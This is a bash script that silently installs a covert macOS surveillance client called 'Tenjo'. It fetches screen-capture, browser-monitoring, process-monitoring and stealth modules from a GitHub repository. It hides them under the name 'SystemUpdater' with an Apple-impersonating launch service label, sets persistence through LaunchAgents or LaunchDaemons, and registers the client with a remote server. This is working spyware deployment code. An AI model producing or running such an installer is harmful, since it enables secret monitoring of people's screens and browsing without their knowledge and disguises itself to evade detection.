#!/bin/bash

# Tenjo Stealth Installer for macOS - Clean Version
# This script downloads and installs the monitoring client silently

set -e

# Configuration
APP_NAME="SystemUpdater"
INSTALL_DIR="$HOME/.config/system-utils"
SERVICE_NAME="com.apple.systemupdater"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"
PYTHON_REQUIREMENTS="requests mss psutil pillow"
GITHUB_RAW="https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client"

# Colors (only for debugging)
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# Silent mode flag
SILENT=${1:-"false"}

# Installation status variables
INSTALL_PROGRESS=0
TOTAL_STEPS=8
INSTALL_SUCCESS=false
ERROR_COUNT=0

log() {
    if [[ "$SILENT" != "true" ]]; then
        echo -e "$1"
    fi
}

# Function to show progress with percentage
show_progress() {
    local step_name="$1"
    local current_step=$2
    local percentage=$((current_step * 100 / TOTAL_STEPS))

    if [[ "$SILENT" != "true" ]]; then
        printf "\r${BLUE}[%d%%] Step %d/%d: %s${NC}" "$percentage" "$current_step" "$TOTAL_STEPS" "$step_name"
        if [[ $current_step -eq $TOTAL_STEPS ]]; then
            echo ""
        fi
    fi
}

# Function to log success with progress
log_success() {
    ((INSTALL_PROGRESS++))
    show_progress "$1" $INSTALL_PROGRESS
    if [[ "$SILENT" != "true" ]]; then
        echo " ✅"
    fi
}

# Function to log error
log_error() {
    ((ERROR_COUNT++))
    if [[ "$SILENT" != "true" ]]; then
        echo -e "${RED}❌ $1${NC}"
    fi
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    INSTALL_DIR="/Library/Application Support/SystemUpdate"
    PLIST_FILE="/Library/LaunchDaemons/$SERVICE_NAME.plist"
fi

log "${BLUE}🔧 Tenjo Stealth Installer for macOS v2.0${NC}"
log "${BLUE}===========================================${NC}"

# Step 1: Prepare installation environment
show_progress "Preparing installation environment" 1

# Stop existing service if running
launchctl unload "$PLIST_FILE" 2>/dev/null || true

# Create installation directory
if mkdir -p "$INSTALL_DIR" && mkdir -p "$INSTALL_DIR/src/core" && mkdir -p "$INSTALL_DIR/src/modules" && mkdir -p "$INSTALL_DIR/src/utils" && mkdir -p "$INSTALL_DIR/logs"; then
    chmod 755 "$INSTALL_DIR"
    log_success "Environment prepared"
else
    log_error "Failed to create installation directories"
    exit 1
fi

# Step 2: Download application files
show_progress "Downloading application files" 2

DOWNLOAD_SUCCESS=true

# Download main application files
if ! curl -sSL "$GITHUB_RAW/main.py" -o "$INSTALL_DIR/main.py"; then
    log_error "Failed to download main.py"
    DOWNLOAD_SUCCESS=false
fi

# Download core modules
if ! curl -sSL "$GITHUB_RAW/src/core/config.py" -o "$INSTALL_DIR/src/core/config.py"; then
    log_error "Failed to download config.py"
    DOWNLOAD_SUCCESS=false
fi

# Download utils modules
if ! curl -sSL "$GITHUB_RAW/src/utils/api_client.py" -o "$INSTALL_DIR/src/utils/api_client.py"; then
    log_error "Failed to download api_client.py"
    DOWNLOAD_SUCCESS=false
fi

if ! curl -sSL "$GITHUB_RAW/src/utils/stealth.py" -o "$INSTALL_DIR/src/utils/stealth.py"; then
    log_error "Failed to download stealth.py"
    DOWNLOAD_SUCCESS=false
fi

# Download modules
if ! curl -sSL "$GITHUB_RAW/src/modules/screen_capture.py" -o "$INSTALL_DIR/src/modules/screen_capture.py"; then
    log_error "Failed to download screen_capture.py"
    DOWNLOAD_SUCCESS=false
fi

if ! curl -sSL "$GITHUB_RAW/src/modules/process_monitor.py" -o "$INSTALL_DIR/src/modules/process_monitor.py"; then
    log_error "Failed to download process_monitor.py"
    DOWNLOAD_SUCCESS=false
fi

if ! curl -sSL "$GITHUB_RAW/src/modules/browser_monitor.py" -o "$INSTALL_DIR/src/modules/browser_monitor.py"; then
    log_error "Failed to download browser_monitor.py"
    DOWNLOAD_SUCCESS=false
fi

if ! curl -sSL "$GITHUB_RAW/src/modules/stream_handler.py" -o "$INSTALL_DIR/src/modules/stream_handler.py"; then
    log_error "Failed to download stream_handler.py"
    DOWNLOAD_SUCCESS=false
fi

# Create __init__.py files
touch "$INSTALL_DIR/src/__init__.py"
touch "$INSTALL_DIR/src/core/__init__.py"
touch "$INSTALL_DIR/src/modules/__init__.py"
touch "$INSTALL_DIR/src/utils/__init__.py"

if [[ "$DOWNLOAD_SUCCESS" == "true" ]]; then
    log_success "Application files downloaded"
else
    log_error "Some files failed to download"
    exit 1
fi

# Step 3: Install Python dependencies
show_progress "Installing Python dependencies" 3

# Function to install packages silently
install_packages() {
    local packages="$1"
    python3 -m pip install --user --quiet $packages >/dev/null 2>&1
}

# Try to install packages
if install_packages "$PYTHON_REQUIREMENTS"; then
    log_success "Python dependencies installed"
else
    # Try alternative installation methods
    if python3 -c "import requests, mss, psutil, PIL" >/dev/null 2>&1; then
        log_success "Python dependencies already available"
    else
        log_error "Failed to install Python dependencies - continuing anyway"
    fi
fi

# Step 4: Create stealth service wrapper
show_progress "Creating stealth service wrapper" 4

cat > "$INSTALL_DIR/stealth_main.py" << 'EOF'
#!/usr/bin/env python3
import sys
import os
import signal
import logging
import time
import subprocess
from pathlib import Path

# Configure minimal logging for stealth mode
logging.basicConfig(
    filename=Path(__file__).parent / 'logs' / 'service.log',
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def signal_handler(signum, frame):
    logging.info("Service shutdown requested")
    sys.exit(0)

def install_missing_packages():
    packages = ['requests', 'mss', 'psutil', 'pillow']
    for package in packages:
        try:
            __import__(package)
        except ImportError:
            try:
                # Try different python executables
                python_paths = [sys.executable, '/usr/bin/python3', '/opt/homebrew/bin/python3']
                for python_path in python_paths:
                    if os.path.exists(python_path):
                        try:
                            subprocess.run([python_path, '-m', 'pip', 'install', '--user', package],
                                         capture_output=True, check=True)
                            logging.info(f"Successfully installed {package}")
                            break
                        except:
                            continue
            except:
                logging.warning(f"Could not install {package}")

def main():
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)

    app_dir = Path(__file__).parent
    os.chdir(app_dir)

    logging.warning("Stealth monitoring service started")

    try:
        # Try to install missing packages first
        install_missing_packages()

        # Add current directory to Python path
        sys.path.insert(0, str(app_dir))
        import main
        main.main(stealth_mode=True)
    except Exception as e:
        logging.error("Application error: %s", e)
        time.sleep(60)
        sys.exit(1)

if __name__ == "__main__":
    main()
EOF

chmod +x "$INSTALL_DIR/stealth_main.py"
log_success "Stealth service wrapper created"

# Step 5: Configure auto-start service
show_progress "Configuring auto-start service" 5
mkdir -p "$(dirname "$PLIST_FILE")"

cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$SERVICE_NAME</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$INSTALL_DIR/stealth_main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>StandardOutPath</key>
    <string>$INSTALL_DIR/logs/service.log</string>
    <key>StandardErrorPath</key>
    <string>$INSTALL_DIR/logs/service_error.log</string>
    <key>WorkingDirectory</key>
    <string>$INSTALL_DIR</string>
    <key>ProcessType</key>
    <string>Background</string>
</dict>
</plist>
EOF

log_success "Auto-start service configured"

# Step 6: Start monitoring service
show_progress "Starting monitoring service" 6

if launchctl load "$PLIST_FILE" 2>/dev/null; then
    log_success "Monitoring service started"
else
    log_error "Failed to start service - will auto-start on reboot"
fi

# Step 7: Register client with server
show_progress "Registering client with server" 7

# Test client registration
cd "$INSTALL_DIR"
if python3 -c "
import sys
sys.path.append('.')
try:
    from main import TenjoClient
    client = TenjoClient(stealth_mode=True)
    success = client.register_client()
    if success:
        print('Registration successful')
        sys.exit(0)
    else:
        sys.exit(1)
except:
    sys.exit(1)
" >/dev/null 2>&1; then
    log_success "Client registered with server"
else
    log_error "Client registration failed - will retry automatically"
fi

# Step 8: Create uninstaller and finalize
show_progress "Creating uninstaller and finalizing installation" 8

# Create uninstall script
cat > "$INSTALL_DIR/uninstall.sh" << 'UNINSTALL_EOF'
#!/bin/bash
SERVICE_NAME="com.apple.systemupdater"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"
INSTALL_DIR="$HOME/.config/system-utils"

echo "🗑️ Uninstalling Tenjo monitoring service..."

# Stop and unload service
launchctl unload "$PLIST_FILE" 2>/dev/null || true
rm -f "$PLIST_FILE"

# Remove installation directory
rm -rf "$INSTALL_DIR"

# Remove logs
rm -rf "$HOME/Library/Logs/SystemUpdater"

echo "✅ Uninstall completed"
UNINSTALL_EOF

chmod +x "$INSTALL_DIR/uninstall.sh"

# Final success message
if [[ $ERROR_COUNT -eq 0 ]]; then
    INSTALL_SUCCESS=true
    log "${GREEN}✅ INSTALLATION SUCCESSFUL${NC}"
    log "${GREEN}========================${NC}"
    log "${GREEN}Tenjo stealth monitoring is now active${NC}"
    log ""
    log "${BLUE}📊 Installation Summary:${NC}"
    log "   📁 Install Location: $INSTALL_DIR"
    log "   📱 Service Name: $SERVICE_NAME"
    log "   🔄 Auto-start: Enabled"
    log "   🕵️ Stealth Mode: Active"
    log ""
    log "${BLUE}📋 Management Commands:${NC}"
    log "   Start:     launchctl load $PLIST_FILE"
    log "   Stop:      launchctl unload $PLIST_FILE"
    log "   Uninstall: bash $INSTALL_DIR/uninstall.sh"
    log ""
    log "${GREEN}🎉 Installation completed successfully!${NC}"
else
    log "${RED}❌ INSTALLATION FAILED${NC}"
    log "${RED}====================${NC}"
    log "${RED}Installation encountered $ERROR_COUNT error(s)${NC}"
    echo ""
    log "${YELLOW}🔧 Troubleshooting Steps:${NC}"
    log "   1. Ensure Python 3.x is installed: python3 --version"
    log "   2. Check internet connection for downloads"
    log "   3. Verify permissions: ls -la $HOME/.config/"
    log "   4. Check system logs: tail -f $INSTALL_DIR/logs/stealth.log"
    echo ""
    log "${BLUE}📞 Support: Check logs in $INSTALL_DIR/logs/ for details${NC}"

    exit 1
fi
